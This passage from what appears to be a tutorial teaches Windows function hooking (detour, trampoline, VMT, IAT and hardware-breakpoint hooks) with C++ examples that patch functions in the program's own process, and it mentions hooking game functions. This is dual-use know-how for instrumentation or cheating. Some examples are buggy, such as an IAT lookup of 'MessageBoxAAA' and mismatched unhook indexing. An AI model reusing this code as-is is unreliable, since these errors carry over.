destination\n\t\n\t// Restoring to previous permission\n\tVirtualProtect(source, length, old_protect, &amp;old_protect);\n\t\n\t// Return true if executed properly\n\treturn true;\n}\nIf the length parameter is less than 5 than the call is returned since detour hooking method requires at least 5 bytes because jump instruction. The formula for calculating the relative offset is destination - source - 5 and that will be used to jump to the destination where the hook function is at. The source where the original function is at can be modified because VirtualProtect() function changes the address space permission to read, write, and execute. Once the necessary bytes has been patched the address space permission can be reverted as it’s stored on old_protect.\nIn simpler terms the detour hooking method replaces jmp foo with jmp hooked_foo so it executes the hooked function instead of the original one. Here’s a overview of the whole detour hook code:\nDetour Examplebool detour_hook(void* source, void* destination, intptr_t length)\n{\n\t// Don&#039;t continue if length is less than 5\n\tif (length &lt; 5)\n\t{\n\t\treturn false;\n\t}\n\t\n\t// Will be used to store previous permission\n\tDWORD old_protect = NULL;\n\t\n\t// Calculating relative offset of destination\n\tDWORD jump_addr = ((DWORD)destination - (DWORD)source) - 5;\n\t\n\t// Changing permission of source\n\tVirtualProtect(source, length, PAGE_EXECUTE_READWRITE, &amp;old_protect);\n\t\n\t*(BYTE*)(source) = 0xE9; // The 0xE9 equals JMP\n\t*(DWORD*)((DWORD)source + 1) = jump_addr; // The jump_addr eqals destination\n\t\n\t// Restoring to previous permission\n\tVirtualProtect(source, length, old_protect, &amp;old_protect);\n\t\n\t// Return true if executed properly\n\treturn true;\n}\n \n// Original function\nint __stdcall foo(int number_one)\n{\n\tprintf(&quot;The magical number: %d\\n&quot;, number_one);\n\treturn 0;\n}\n \n// Hook function\nint __stdcall hooked_foo(int number_one)\n{\n\tprintf(&quot;The non-magical number: %d&quot;, number_one);\n\treturn 0;\n}\n \nint main()\n{\n\t// If hooking was successful\n\tif (detour_hook(foo, hooked_foo, 5) == true)\n\t{\n\t\tfoo(10);\n\t}\n\t// If hooking was unsuccessful\n\telse {\n\t\tprintf(&quot;detour_hook: failed\\n&quot;);\n\t}\n\treturn 0;\n}\nThe non-magical number: 10\nWhat does all that code do? All it does is it replaces jmp foo with jmp hooked_foo and if the detour hook was successful the foo() function is called but the hooked_foo() function will be executed instead. I recommend trying out detour hooking on your own environment by attaching a debugger onto it as it will help you to understand the code better.\nInline Hooking\nInline Hooking Graph                                                    Original Function\n                                           +--------------------------------+\n                                           | MessageBoxA_Address:           |\n+------------------+      +--------+    +-&gt;| mov edi, edi                   |\n| call MessageBoxA |-----&gt;| Hooked |----+  | push ebp                       |\n+------------------+      +--------+ No    | mov ebp, esp                   |\n                               | Yes       | cmp dword ptr fs[00000000], 0  |\n                               |           | more...                        |\n                               |           +--------------------------------+\n                               |\n                               |\n                               v                          +------------------------------+ \n                +--------------------------------+    +--&gt;| hooked_messageboxa_address:  |\n                | MessageBoxA_Address:           |  +-+   | push ebp                     |\n                | jmp hooked_messageboxa         |--+     | mov esp, ebp                 | \nContinue  +----&gt;| cmp dword ptr fs[00000000], 0  |        | executes our custom code...  |\nExecution |     | more...                        |        | jmp trampoline_addr          |---------+ \n          |     +--------------------------------+        | ret                          |         |\n          |                                               +------------------------------+         |\n          |                                                                                        |\n          |                                                                                        |\n          |                                                                                        |\n          |                                                                                        |\n          |                                                    +------------------------------+    |\n          |                                                    | trampoline_addr_address:     |    |\n          |                                                    | mov edi, edi                 |&lt;---+\n          |                                                    | push ebp                     |\n          |                                                    | mov esp, ebp                 |\n          +----------------------------------------------------| jmp MessageBoxA              |\n                                                               +------------------------------+\nInline Hooking (Trampoline Hooking) is a technique which copies the necessary bytes to a memory location before the bytes are replaced with a jump instruction which jumps to hook function. Inside the memory location a jump instruction is placed to jump to the original function to continue the execution flow.\nInline Hooking FunctionLPVOID trampoline_hook(void* source, void* destination, intptr_t length)\n{\n\t// Don&#039;t continue if length is less than 5\n\tif (length &lt; 5)\n\t{\n\t\treturn 0;\n\t}\n\t\n\t// Trampoline assembly code\n\tCHAR trampoline[20] = {};\n \n\t// Allocating memory space\n\tLPVOID trampoline_addr = VirtualAlloc(NULL, 20, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\t\n\t// Copying bytes from source\n\tmemcpy(trampoline, source, length);\n\t\n\t// Calculating original function address\n\tDWORD original_func_addr = (DWORD)((DWORD)source - (DWORD)trampoline_addr - length);\n\t\n\t*(BYTE*)(trampoline + length) = 0xE9;\n\t*(DWORD*)((DWORD)trampoline + length + 1) = original_func_addr;\n \n\t// Writes bytes from trampoline to trampoline_addr\n\tWriteProcessMemory(GetCurrentProcess(), trampoline_addr, trampoline, 20, NULL);\n\t\n\t// Will be used to store previous permission\n\tDWORD old_protect = NULL;\n\t\n\t// Calculating relative offset of destination\n\tDWORD jump_addr = ((DWORD)destination - (DWORD)source) - 5;\n\t\n\t// Changing permission of source\n\tVirtualProtect(source, length, PAGE_EXECUTE_READWRITE, &amp;old_protect);\n\t\n\t*(BYTE*)(source) = 0xE9; // The 0xE9 equals JMP\n\t*(DWORD*)((DWORD)source + 1) = jump_addr; // The jump_addr eqals destination\n\t\n\t// Restoring to previous permission\n\tVirtualProtect(source, length, old_protect, &amp;old_protect);\n\t\n\t// Return true if executed properly\n\treturn trampoline_addr;\n}\nThe trampoline array will be used to store the bytes and the bytes from original function is copied using memcpy() function. A jump instruction is added onto the array and the relative offset is calculated using the formula source - trampoline_addr - length. The WriteProcessMemory function is used to transfer the bytes from trampoline to trampoline_addr and once the function exits the trampoline_addr address is returned which will be used by us to continue the execution flow. The rest of the function is using detour hooking method to jump to hook function. Here’s a overview of Inline Hooking being used on MessageBoxA() function.\nInline Hooking Example#include &lt;iostream&gt;\n#include &lt;Windows.h&gt;\n \nLPVOID trampoline_hook(void* source, void* destination, intptr_t length)\n{\n\t// Don&#039;t continue if length is less than 5\n\tif (length &lt; 5)\n\t{\n\t\treturn 0;\n\t}\n\t\n\t// Trampoline assembly code\n\tCHAR trampoline[20] = {};\n \n\t// Allocating memory space\n\tLPVOID trampoline_addr = VirtualAlloc(NULL, 20, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n \n\t// Calculating original function address\n\tDWORD original_func_addr = (DWORD)((DWORD)source - (DWORD)trampoline_addr - length);\n \n\t// Copying bytes from source\n\tmemcpy(trampoline, source, length);\n \n\t*(BYTE*)(trampoline + length) = 0xE9;\n\t*(DWORD*)((DWORD)trampoline + length + 1) = original_func_addr;\n \n\t// Writes bytes from trampoline to trampoline_addr\n\tWriteProcessMemory(GetCurrentProcess(), trampoline_addr, trampoline, 20, NULL);\n\t\n\t// Will be used to store previous permission\n\tDWORD old_protect = NULL;\n \n\t// Calculating relative offset of destination\n\tDWORD jump_addr = ((DWORD)destination - (DWORD)source) - 5;\n \n\t// Changing permission of source\n\tVirtualProtect(source, length, PAGE_EXECUTE_READWRITE, &amp;old_protect);\n \n\t*(BYTE*)(source) = 0xE9; // The 0xE9 equals JMP\n\t*(DWORD*)((DWORD)source + 1) = jump_addr; // The jump_addr eqals destination\n \n\t// Restoring to previous permission\n\tVirtualProtect(source, length, old_protect, &amp;old_protect);\n \n\t// Return true if executed properly\n\treturn trampoline_addr;\n}\n \n// Will be used to call original function\ntypedef int(__stdcall* t_orig_messageboxa)(HWND hwnd, LPCSTR lp_text, LPCSTR lp_caption, UINT u_type);\nt_orig_messageboxa messageboxa_trampoline = nullptr;\n \n// Hooked function\nint __stdcall hooked_messageboxa(HWND hwnd, LPCSTR lp_text, LPCSTR lp_caption, UINT u_type)\n{\n\tlp_text    = &quot;Hooked!&quot;;\n\tlp_caption = &quot;Hooked!&quot;;\n\treturn messageboxa_trampoline(hwnd, lp_text, lp_caption, u_type);\n}\n \nint main()\n{\n\t// Getting address of MessageBoxA to replace it with our hooked_messageboxa\n\tmessageboxa_trampoline = (t_orig_messageboxa)trampoline_hook(GetProcAddress(GetModuleHandleA(&quot;user32.dll&quot;), &quot;MessageBoxA&quot;), hooked_messageboxa, 5);\n \n\t// Calling function MessageBoxA\n\tMessageBoxA(NULL, &quot;Hi&quot;, &quot;Hi&quot;, MB_OK);\n \n\t// Returning\n\treturn 0;\n}\nThe reason messageboxa_trampoline() is called inside hooked_messageboxa() function because it will continue the execution flow to avoid potential crashes. Inside the hooked_messageboxa() function the lp_text and lp_caption will be changed to “Hooked” that shows that the Inline Hooking was successful.\nVMT Hooking\nVMT Hooking Graph+---------+      +--------+      +--------------------+\n| Class A |-----&gt;| Hooked |-----&gt;| VTable for Class A |      +---------------------------+\n+---------+      +--------+ No   +--------------------+      | function_one_addr:        |\n                     | Yes       | function_one       |-----&gt;| push ebp                  |\n                     |           +--------------------+      | mov esp, ebp              |\n                     |           | function_two       |      | sub esp, 40               |\n                     |           +--------------------+      | executes original code... |\n                     |           | function_three     |      | ret                       |\n                     |           +--------------------+      +---------------------------+\n                     v \n        +---------------------------+\n        | Hooked VTable for Class A |      +-----------------------------+     +-----------------------------+\n        +---------------------------+      | hooked_function_one_addr:   |     | hooked_function_three_addr: |\n        | hooked_function_one       |-----&gt;| push ebp                    |  +-&gt;| push ebp                    |\n        +---------------------------+      | mov esp, ebp                |  |  | mov ebp, esp                |\n        | function_two              |--+   | sub esp, 10                 |  |  | sub esp, 5                  |\n        +---------------------------+  |   | executes our custom code... |  |  | executes our custom code... |\n        | hooked_function_three     |--++  | ret                         |  |  | ret                         |\n        +---------------------------+  |   +-----------------------------+  |  +-----------------------------+\n                                       +------------------------------------+\n                                       |   \n                                       |  +-------------------------------+\n                                       +-&gt;| function_two_addr:            |\n                                          | push ebp                      |\n                                          | mov ebp, esp                  |\n                                          | sub esp, 10                   |\n                                          | executes the original code... |\n                                          | ret                           |\n                                          +-------------------------------+ \nVMT Hooking is a technique that hooks functions in classes but the functions are required to be virtual state for it to be hooked. If the function is not in a virtual state than the function cannot be hooked since the Virtual Table (VTable) will not be created. VMT Hooking is a useful technique for hooking game functions in classes since the functions are usually in a virtual state.\nVMT Hook Classclass vmt_hook {\nprivate:\n\tstd::unique_ptr&lt;uintptr_t[]&gt; vt_new\t\t  = NULL;\n\tuintptr_t**\t\t\t\t\t base_class   = NULL;\n\tuintptr_t*                   original_vft = NULL;\n\tint\t\t\t\t\t\t\t nums_funcs   = NULL;\npublic:\n\tvmt_hook(void** base_class)\n\t{\n\t\t// The this-&gt;base_class points to virtual table\n\t\tthis-&gt;base_class = reinterpret_cast&lt;uintptr_t**&gt;(base_class);\n\t\t\n\t\t// Counting total amount of virutal functions in a class\n\t\twhile (reinterpret_cast&lt;uintptr_t*&gt;(this-&gt;base_class)[this-&gt;nums_funcs])\n\t\t{\n\t\t\t++this-&gt;nums_funcs;\n\t\t}\n \n\t\t// Calculating the size of the total functions\n\t\tunsigned int table_size = (this-&gt;nums_funcs * 4);\n \n\t\t// The this-&gt;original_vft points to this-&gt;base_class\n\t\tthis-&gt;original_vft = *this-&gt;base_class;\n\t\t\n\t\t// Allocating space in unique_ptr\n\t\tvt_new = std::make_unique&lt;uintptr_t[]&gt;(this-&gt;nums_funcs);\n \n\t\t// Copying the virtual table over to vt_new\n\t\tmemcpy(vt_new.get(), this-&gt;original_vft, table_size);\n \n\t\t// The virtual table is replaced with vt_new\n\t\t*base_class = vt_new.get();\n\t}\n \n\t// Hooks an function\n\tbool hook(void* new_fn, int index)\n\t{\n\t\tvt_new[index] = reinterpret_cast&lt;uintptr_t&gt;(new_fn);\n\t\treturn false;\n\t}\n \n\t// Unhooks a specific function\n\tbool unhook(int index)\n\t{\n\t\tif (vt_new[index + 1] != NULL)\n\t\t{\n\t\t\tvt_new[index + 1] = *this-&gt;base_class[index];\n\t\t\treturn true;\n\t\t}\n\t\treturn false;\n\t}\n \n\t// Unhooks all the functions\n\tbool unhook_all()\n\t{\n\t\tif (*this-&gt;base_class != NULL)\n\t\t{\n\t\t\t*this-&gt;base_class = this-&gt;original_vft;\n\t\t\treturn true;\n\t\t}\n\t\treturn false;\n\t}\n \n\t// Destructor\n\t~vmt_hook()\n\t{\n\t\tif (*this-&gt;base_class != NULL)\n\t\t{\n\t\t\t*this-&gt;base_class = this-&gt;original_vft;\n\t\t}\n\t}\n};\nThe constructor will use vt_new to replace the Virtual Table Pointer for class_a and the destructor will restore the Virtual Table Poiinter to to the original address. The hook() function will hook the function and the unhook() function will unhook a specific function and the unhook_all() function will unhook all the functions. Here’s a example of VMT Hooking class in use:\nVMT Hooking Example#include &lt;iostream&gt;\n#include &lt;Windows.h&gt;\n \n// VMT Hook Class\nclass vmt_hook {\nprivate:\n\tstd::unique_ptr&lt;uintptr_t[]&gt; vt_new\t\t  = NULL;\n\tuintptr_t**\t\t\t\t\t base_class   = NULL;\n\tuintptr_t*                   original_vft = NULL;\n\tint\t\t\t\t\t\t\t nums_funcs   = NULL;\npublic:\n\tvmt_hook(void** base_class)\n\t{\n\t\t// The this-&gt;base_class points to virtual table\n\t\tthis-&gt;base_class = reinterpret_cast&lt;uintptr_t**&gt;(base_class);\n\t\t\n\t\t// Counting total amount of virutal functions in a class\n\t\twhile (reinterpret_cast&lt;uintptr_t*&gt;(this-&gt;base_class)[this-&gt;nums_funcs])\n\t\t{\n\t\t\t++this-&gt;nums_funcs;\n\t\t}\n \n\t\t// Calculating the size of the total functions\n\t\tunsigned int table_size = (this-&gt;nums_funcs * 4);\n \n\t\t// The this-&gt;original_vft points to this-&gt;base_class\n\t\tthis-&gt;original_vft = *this-&gt;base_class;\n\t\t\n\t\t// Allocating space in unique_ptr\n\t\tvt_new = std::make_unique&lt;uintptr_t[]&gt;(this-&gt;nums_funcs);\n \n\t\t// Copying the virtual table over to vt_new\n\t\tmemcpy(vt_new.get(), this-&gt;original_vft, table_size);\n \n\t\t// The virtual table is replaced with vt_new\n\t\t*base_class = vt_new.get();\n\t}\n \n\t// Hooks an function\n\tbool hook(void* new_fn, int index)\n\t{\n\t\tvt_new[index] = reinterpret_cast&lt;uintptr_t&gt;(new_fn);\n\t\treturn false;\n\t}\n \n\t// Unhooks a specific function\n\tbool unhook(int index)\n\t{\n\t\tif (vt_new[index + 1] != NULL)\n\t\t{\n\t\t\tvt_new[index + 1] = *this-&gt;base_class[index];\n\t\t\treturn true;\n\t\t}\n\t\treturn false;\n\t}\n \n\t// Unhooks all the functions\n\tbool unhook_all()\n\t{\n\t\tif (*this-&gt;base_class != NULL)\n\t\t{\n\t\t\t*this-&gt;base_class = this-&gt;original_vft;\n\t\t\treturn true;\n\t\t}\n\t\treturn false;\n\t}\n \n\t// Destructor\n\t~vmt_hook()\n\t{\n\t\tif (*this-&gt;base_class != NULL)\n\t\t{\n\t\t\t*this-&gt;base_class = this-&gt;original_vft;\n\t\t}\n\t}\n};\n \n// Class A\nclass a {\npublic:\n\tvirtual void function_one()\n\t{\n\t\tprintf(&quot;a::function_one()\\n&quot;);\n\t\treturn;\n\t}\n\tvoid function_two()\n\t{\n\t\tprintf(&quot;a::function_two()\\n&quot;);\n\t\treturn;\n\t}\n\tvirtual void function_three()\n\t{\n\t\tprintf(&quot;a::function_three()\\n&quot;);\n\t\treturn;\n\t}\n};\n \n// The function which will be used to replace virtual functions\nvoid hooked_function()\n\t{\n\tprintf(&quot;hooked_function() called\\n&quot;);\n}\n \nint main()\n{ \n\t// Creating classes\n\ta* class_a = new a();\n\tvmt_hook* vmt = new vmt_hook((void**)class_a);\n \n\t// Hooking a::function_one and a::function_three\n\tprintf(&quot;--Hooks Functions---\\n&quot;);\n\tvmt-&gt;hook(hooked_function, 0);\n\tvmt-&gt;hook(hooked_function, 1);\n\t\n\t// Calls all the functions\n\tclass_a-&gt;function_one();\n\tclass_a-&gt;function_two();\n\tclass_a-&gt;function_three();\n \n\t// Unhooks everything\n\tprintf(&quot;--Unhooks Functions---\\n&quot;);\n\tvmt-&gt;unhook_all();\n \n\t// Calls all the functions\n\tclass_a-&gt;function_one();\n\tclass_a-&gt;function_two();\n\tclass_a-&gt;function_three();\n \n\treturn 0;\n}\nVMT Hooking Result--Hooks Functions---\nhooked_function() called\na::function_two()\nhooked_function() called\n \n--Unhooks Functions---\na::function_one()\na::function_two()\na::function_three()\nIAT Hooking\nIAT Hooking Graph+-------------------+            \n| main:             |                                                +---------------------------+\n| push ebp          |                                                | MessageBoxA_addr:         |\n| mov esp, ebp      |                                           +---&gt;| mov edi, edi              |&lt;-+\n| code..            |       +--------+      +-----------------+ |    | push ebp                  |  |\n| call MessageBoxA  |------&gt;| Hooked |-----&gt;| jmp MessageBoxA |-+    | mov ebp, esp              |  |\n| code...           |       +--------+ No   +-----------------+      | executes original code... |  |\n| ret               |           | Yes                                | ret                       |  | \n+-------------------+           |                                    +---------------------------+  |\n                                |                                                                   |\n                                |                                                                   |\n                                |                      +---------------------------+                |\n                                v              +-----&gt; | hooked_messageboxa_addr:  |                |\n                    +------------------------+ |       | push ebp                  |                |\n                    | jmp hooked_messageboxa | |       | mov ebp, esp              |                |\n                    +------------------------+ |       | executes our code...      |                |\n                                |              |       | call MessageBoxA          |----------------+\n                                +--------------+       | ret                       |\n                                                       +---------------------------+\nWindows executables has a Import Address Table (IAT) which contains different functionalities that allows us to interact with the operating system. IAT Hooking allows us to replace these functionalities with our own code and then we can call the original function inside of our code to ensure the application is running smoothly.\nIAT Hooking FunctionDWORD iat_hook(void* source, LPCSTR destination)\n{\n\t// No need to get Module Handle\n\tLPVOID image_base = GetModuleHandleA(NULL);\n \n\t// dos_headers is a pointer to DOS_HEADER\n\tPIMAGE_DOS_HEADER dos_headers = (PIMAGE_DOS_HEADER)image_base;\n \n\t// nt_headers is a pointer to NT_HEADERS\n\tPIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((DWORD)image_base + dos_headers-&gt;e_lfanew);\n \n\t// Will be used to get all the DLL imports \n\tPIMAGE_IMPORT_DESCRIPTOR import_descriptor = NULL;\n \n\t// imports_directory is a pointer to  &quot;Import Directory&quot;\n\tIMAGE_DATA_DIRECTORY imports_directory = nt_headers-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];\n \n\t// Will be used to get library names\n\timport_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)(imports_directory.VirtualAddress + (DWORD)image_base);\n \n\t// Variables\n\tLPCSTR library_name = NULL;\n\tHMODULE library = NULL;\n\tPIMAGE_IMPORT_BY_NAME function_name = NULL;\n \n\t// Loops through functions inside of Import Address Table to the function is found\n\twhile (import_descriptor-&gt;Name != NULL)\n\t{\n\t\tlibrary_name = (LPCSTR)import_descriptor-&gt;Name + (DWORD)image_base;\n\t\tlibrary = LoadLibraryA(library_name);\n \n\t\tif (library)\n\t\t{\n\t\t\tPIMAGE_THUNK_DATA original_first_thunk = NULL, first_thunk = NULL;\n\t\t\toriginal_first_thunk = (PIMAGE_THUNK_DATA)((DWORD)image_base + import_descriptor-&gt;OriginalFirstThunk);\n\t\t\tfirst_thunk = (PIMAGE_THUNK_DATA)((DWORD)image_base + import_descriptor-&gt;FirstThunk);\n \n\t\t\twhile (original_first_thunk-&gt;u1.AddressOfData != NULL)\n\t\t\t{\n\t\t\t\tfunction_name = (PIMAGE_IMPORT_BY_NAME)((DWORD)image_base + original_first_thunk-&gt;u1.AddressOfData);\n \n\t\t\t\tif (std::string(function_name-&gt;Name).compare(destination) == 0)\n\t\t\t\t{\n\t\t\t\t\tSIZE_T bytes_written = 0;\n\t\t\t\t\tDWORD old_protect = NULL;\n\t\t\t\t\tVirtualProtect(&amp;first_thunk-&gt;u1.Function, 5, PAGE_READWRITE, &amp;old_protect);\n \n\t\t\t\t\t// Storing original address\n\t\t\t\t\tDWORD original_addr =  (DWORD)first_thunk-&gt;u1.Function;\n \n\t\t\t\t\t// Overriding MessageBoxA with hooked_messageboxa\n\t\t\t\t\tfirst_thunk-&gt;u1.Function = (DWORD)source;\n \n\t\t\t\t\t// Returning address\n\t\t\t\t\treturn original_addr;\n\t\t\t\t}\n\t\t\t\t++original_first_thunk;\n\t\t\t\t++first_thunk;\n\t\t\t}\n\t\t}\n\t\t++import_descriptor;\n\t}\n\t\n\treturn NULL;\n}\nInside the iat_hook() function the Import Address Table is being searched through to find the specified function in destination parameter, and once the function is found the address is stored at original_addr variable and then the address is overwritten with source parameter. Here’s a overview of IAT Hooking in use:\nIAT Hooking Example#include &lt;iostream&gt;\n#include &lt;Windows.h&gt;\n \nDWORD iat_hook(void* source, LPCSTR destination)\n{\n\t// No need to get Module Handle\n\tLPVOID image_base = GetModuleHandleA(NULL);\n \n\t// dos_headers is a pointer to DOS_HEADER\n\tPIMAGE_DOS_HEADER dos_headers = (PIMAGE_DOS_HEADER)image_base;\n \n\t// nt_headers is a pointer to NT_HEADERS\n\tPIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((DWORD)image_base + dos_headers-&gt;e_lfanew);\n \n\t// Will be used to get all the DLL imports \n\tPIMAGE_IMPORT_DESCRIPTOR import_descriptor = NULL;\n \n\t// imports_directory is a pointer to  &quot;Import Directory&quot;\n\tIMAGE_DATA_DIRECTORY imports_directory = nt_headers-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];\n \n\t// Will be used to get library names\n\timport_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)(imports_directory.VirtualAddress + (DWORD)image_base);\n \n\t// Variables\n\tLPCSTR library_name = NULL;\n\tHMODULE library = NULL;\n\tPIMAGE_IMPORT_BY_NAME function_name = NULL;\n \n\t// Will loop to &quot;MessageBoxA&quot; function is found on import table.\n\twhile (import_descriptor-&gt;Name != NULL)\n\t{\n\t\t// Getting library name\n\t\tlibrary_name = (LPCSTR)import_descriptor-&gt;Name + (DWORD)image_base;\n \n\t\t// Getting library\n\t\tlibrary = LoadLibraryA(library_name);\n \n\t\tif (library)\n\t\t{\n\t\t\tPIMAGE_THUNK_DATA original_first_thunk = NULL, first_thunk = NULL;\n\t\t\toriginal_first_thunk = (PIMAGE_THUNK_DATA)((DWORD)image_base + import_descriptor-&gt;OriginalFirstThunk);\n\t\t\tfirst_thunk = (PIMAGE_THUNK_DATA)((DWORD)image_base + import_descriptor-&gt;FirstThunk);\n \n\t\t\twhile (original_first_thunk-&gt;u1.AddressOfData != NULL)\n\t\t\t{\n\t\t\t\tfunction_name = (PIMAGE_IMPORT_BY_NAME)((DWORD)image_base + original_first_thunk-&gt;u1.AddressOfData);\n \n\t\t\t\tif (std::string(function_name-&gt;Name).compare(destination) == 0)\n\t\t\t\t{\n\t\t\t\t\tSIZE_T bytes_written = 0;\n\t\t\t\t\tDWORD old_protect = NULL;\n\t\t\t\t\tVirtualProtect(&amp;first_thunk-&gt;u1.Function, 5, PAGE_READWRITE, &amp;old_protect);\n \n\t\t\t\t\t// Storing original address\n\t\t\t\t\tDWORD original_addr =  (DWORD)first_thunk-&gt;u1.Function;\n \n\t\t\t\t\t// Overriding MessageBoxA with hooked_messageboxa\n\t\t\t\t\tfirst_thunk-&gt;u1.Function = (DWORD)source;\n \n\t\t\t\t\t// Returning address\n\t\t\t\t\treturn original_addr;\n\t\t\t\t}\n\t\t\t\t++original_first_thunk;\n\t\t\t\t++first_thunk;\n\t\t\t}\n\t\t}\n\t\t++import_descriptor;\n\t}\n \n\treturn NULL;\n}\n \ntypedef int(__stdcall* t_orig_messageboxa)(HWND hwnd, LPCSTR lp_text, LPCSTR lp_caption, UINT u_type);\nt_orig_messageboxa messageboxa_iat = nullptr;\n \nint __stdcall hooked_messageboxa(HWND hwnd, LPCSTR lp_text, LPCSTR lp_caption, UINT u_type)\n{\n\t// Changing lp_text and lp_caption values\n\tlp_text = &quot;Hooked!&quot;;\n\tlp_caption = &quot;hooked!&quot;;\n \n\t// Calling original MessageBoxA\n\treturn messageboxa_iat(hwnd, lp_text, lp_caption, u_type);\n}\n \nint main()\n{\n\t// Hooking MessageBoxA\n\tmessageboxa_iat = (t_orig_messageboxa)iat_hook(hooked_messageboxa, &quot;MessageBoxAAA&quot;);\n \n\t// Calling MessageBoxA\n\tMessageBoxA(NULL, &quot;Hello&quot;, &quot;Hello&quot;, NULL);\n \n\t// Exiting\n\treturn 0;\n}\nWhat is happening inside the code? The iat_hook() function is called to hook the MessageBoxA function with hooked_messageboxa function and then the MessageBoxA() function is called to see if the hooking was successful.\nHardware Breakpoint Hooking\nHardware Breakpoint Hooking Graphdebug registers\n   +-----+            +----------------------------------------+      +-----+\n   | DR0 |-----------&gt;| display_message_addr:                  |   +--| Hit |---------+\n   | DR1 | Breakpoint | push ebp                               |&lt;--+  +-----+         |\n   | DR2 |            | code...                                |                      |\n   | DR3 |            | push ecx                               |&lt;--+                  v \n   +-----+            | lea edi, [ebp-0Ch]                     |   |  +------------------------------------+\n                      | mov ecx, 3                             |   +--| exception_info-&gt;ContextRecord-&gt;Ecx |\n                      | mov eax, 0CCCCCCCCCCh                  |      +------------------------------------+\n                      | pop ecx                                |                      |\n                      | mov dword ptr [message], ecx           |                      |\n                      | mov ecx, offset _44F27096_FileName@cpp |                      v\n                      | call printf                            |       +----------------------------------+\n                      | code...                                |       | We can change ECX register value |\n                      +----------------------------------------+       +----------------------------------+\nIntel x86 and x64 architecture provide a set of registers that are useful for debugging. The DR0 to DR3 are considered “Debug Address Registers” since these registers are used to store the address of the hardware breakpoints. The DR7 register is considered as “Debug Control Register” since it’s used to enbale and disable the DR0 to DR3 registers. The DR6 register holds information about the DR0 to DR3 registers once a breakpoint has been triggered.\nHardware Breakpoint Hooking requires us to find the main thread and that can be found enumerating all threads to search for the thread with the earliest creation time, that is what the function get_main_thread_id() function does:\nGet Main Thread Function// The function will return the thread with earliest creation time\nDWORD get_main_thead_id(const HANDLE process_handle) {\n \n    std::shared_ptr&lt;HPSS&gt; snapshot(new HPSS{}, [&amp;](HPSS* snapshotPtr) {\n        PssFreeSnapshot(process_handle, *snapshotPtr);\n        });\n \n    if (PssCaptureSnapshot(process_handle, PSS_CAPTURE_THREADS, 0, snapshot.get()) != ERROR_SUCCESS)\n    {\n        printf(&quot;PssCaptureSnapshot failed...&quot;);\n    }\n \n    std::shared_ptr&lt;HPSSWALK&gt; walker(new HPSSWALK{}, [&amp;](HPSSWALK* walkerPtr) { PssWalkMarkerFree(*walkerPtr); });\n \n    if (PssWalkMarkerCreate(nullptr, walker.get()) != ERROR_SUCCESS)\n    {\n        printf(&quot;PssWalkMarkerCreate failed...&quot;);\n    }\n \n    DWORD main_thread_id{};\n    FILETIME lowest_create_time{ MAXDWORD, MAXDWORD };\n \n    PSS_THREAD_ENTRY thread{};\n \n    // Iterate through the threads and keep track of the one\n    // with the lowest creation time.\n    while (PssWalkSnapshot(*snapshot, PSS_WALK_THREADS,\n        *walker, &amp;thread, sizeof(thread)) == ERROR_SUCCESS) {\n        if (CompareFileTime(&amp;lowest_create_time, &amp;thread.CreateTime) == 1) {\n            lowest_create_time = thread.CreateTime;\n            main_thread_id = thread.ThreadId;\n        }\n    }\n \n    return main_thread_id;\n}\nThe set_debug_breakpoint() function will set a hardware breakpoint on target_addr parameter and enable hardware breakpoints.\nSet Debug Breakpoint Functionbool set_debug_breakpoint(const HANDLE&amp; main_thread_handle, const void* const target_addr)\n{\n    CONTEXT context{\n        .ContextFlags = CONTEXT_DEBUG_REGISTERS,\n        .Dr0 = (DWORD)target_addr,\n        .Dr7 = (1 &lt;&lt; 0)\n    };\n \n    // Set the main threads context\n    if (!SetThreadContext(main_thread_handle, &amp;context)) {\n        printf(&quot;SetThreadContext failed...\\n&quot;);\n        return false;\n    }\n \n    // Resume the thread after setting its context\n    ResumeThread(main_thread_handle);\n \n    return true;\n}\nThe exception_handler() function will check which debug address register has been triggered and if the DR0 register has been triggered than ECX value is changed to “Hooked Message”.\nLONG WINAPI exception_handler(EXCEPTION_POINTERS* const exception_info)\n{\n    if (exception_info-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_SINGLE_STEP)\n    {\n        if (exception_info-&gt;ContextRecord-&gt;Dr6 &amp; 0x1)\n        {\n            auto first_parameter = reinterpret_cast&lt;std::string*&gt;(exception_info-&gt;ContextRecord-&gt;Ecx);\n            *first_parameter = &quot;Hooked Message\\n&quot;;\n \n            exception_info-&gt;ContextRecord-&gt;EFlags |= 0x10000;\n        }\n     \n        return EXCEPTION_CONTINUE_EXECUTION;\n    }\n   \n    return EXCEPTION_CONTINUE_EXECUTION;\n}\nThe message parameter of the display_message() function will be hooked so each time the function is called the message &quot;Hooked&quot; is displayed instead of the original message inside of the message parameter.\nDisplay Message Functionvoid __fastcall display_message(const std::string&amp; message)\n{\n    printf(&quot;%s\\n&quot;, message.c_str());\n}\nNow since all the functions purposes has been explained. Here’s a overview of Hardware Breakpoint Hooking in use:\nHardware Breakpoint Hooking Example#include &lt;iostream&gt;\n#include &lt;Windows.h&gt;\n#include &lt;thread&gt;\n#include &lt;TlHelp32.h&gt;\n#include &lt;ProcessSnapshot.h&gt;\n \nLONG WINAPI exception_handler(EXCEPTION_POINTERS* const exception_info)\n{\n    if (exception_info-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_SINGLE_STEP)\n    {\n        if (exception_info-&gt;ContextRecord-&gt;Dr6 &amp; 0x1)\n        {\n            auto first_parameter = reinterpret_cast&lt;std::string*&gt;(exception_info-&gt;ContextRecord-&gt;Ecx);\n            *first_parameter = &quot;Hooked\\n&quot;;\n \n            exception_info-&gt;ContextRecord-&gt;EFlags |= 0x10000;\n        }\n     \n        return EXCEPTION_CONTINUE_EXECUTION;\n    }\n   \n    return EXCEPTION_CONTINUE_EXECUTION;\n}\n \nDWORD get_main_thead_id(const HANDLE process_handle) {\n \n    std::shared_ptr&lt;HPSS&gt; snapshot(new HPSS{}, [&amp;](HPSS* snapshotPtr) {\n        PssFreeSnapshot(process_handle, *snapshotPtr);\n        });\n \n    if (PssCaptureSnapshot(process_handle, PSS_CAPTURE_THREADS, 0, snapshot.get()) != 